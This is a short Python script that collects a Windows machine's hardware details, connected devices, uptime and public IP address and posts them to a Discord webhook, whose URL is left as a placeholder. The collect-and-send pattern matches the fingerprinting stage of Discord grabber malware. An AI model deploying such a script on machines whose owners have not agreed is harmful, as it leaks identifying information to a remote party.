import psutil
import wmi
import requests
import time

# Get information about CPU
cpu_count = psutil.cpu_count()
cpu_freq = psutil.cpu_freq()
cpu_percent = psutil.cpu_percent()

# Get information about RAM
virtual_memory = psutil.virtual_memory()
total_ram = virtual_memory.total
used_ram = virtual_memory.used

# Get information about GPU
c = wmi.WMI()
gpu_info = c.Win32_VideoController()[0]
gpu_name = gpu_info.Name

# Get information about connected mouse, keyboard, and monitor
devices = wmi.WMI().Win32_PnPEntity()
connected_mouse = [device.Name for device in devices if device.Name and 'mouse' in device.Name.lower()]

connected_keyboard = [device.Name for device in devices if device.Name and 'keyboard' in device.Name.lower()]
connected_monitor = [device.Name for device in devices if device.Name and 'monitor' in device.Name.lower()]


# Get information about uptime
boot_time = psutil.boot_time()
uptime_seconds = int(time.time() - boot_time)

# Get IP information
ip_response = requests.get("https://api64.ipify.org")
ip = ip_response.text

# Prepare the payload to send to the discord webhook
payload = {
    "embeds": [{
        "title": "PC Information",
        "fields": [
            {
                "name": "CPU",
                "value": f"Cores: {cpu_count}\nFrequency: {cpu_freq.current:.0f} MHz\nUsage: {cpu_percent}%",
                "inline": True
            },
            {
                "name": "RAM",
                "value": f"Total: {total_ram / 1024**3:.2f} GB\nUsed: {used_ram / 1024**3:.2f} GB",
                "inline": True
            },
            {
                "name": "GPU",
                "value": f"Name: {gpu_name}",
                "inline": True
            },
            {
                "name": "Connected Devices",
                "value": f"Mouse: {connected_mouse}\nKeyboard: {connected_keyboard}\nMonitor: {connected_monitor}",
                "inline": False
            },
            {
                 "name": "Uptime",
                "value": f"{uptime_seconds // 3600} hours {(uptime_seconds % 3600) // 60} minutes",
                "inline": True
            },
            {
                "name": "IP",
                "value": f"{ip}",
                "inline": True
            },
        ]
    }]
}

# Send the payload to the Discord webhook
# Send the payload to the Discord webhook
response = requests.post("enter your webhook url", json=payload)

